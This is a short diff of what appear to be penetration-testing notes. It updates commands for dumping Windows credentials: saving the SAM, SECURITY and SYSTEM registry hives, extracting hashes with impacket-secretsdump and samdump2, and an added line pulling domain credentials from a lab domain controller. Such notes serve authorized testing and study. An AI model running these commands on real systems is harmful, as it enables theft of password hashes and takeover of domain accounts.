@@ -52,12 +52,15 @@ reg save hklm\sam c:\Users\Public\sam.save
 reg save hklm\security c:\Users\Public\security.save
 reg save hklm\system c:\Users\Public\system.save
 
-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL 
-secretsdump.py -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL
+/usr/bin/impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL 
+/usr/bin/impacket-secretsdump -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL
 
 reg save hklm\sam sam.hiv
 reg save hklm\system system.hiv
 samdump2 system.hiv sam.hiv > hash.txt
+
+/usr/bin/impacket-secretsdump -just-dc -k -no-pass worklab/DC01\$@172.16.40.5
+
 ```
 
 
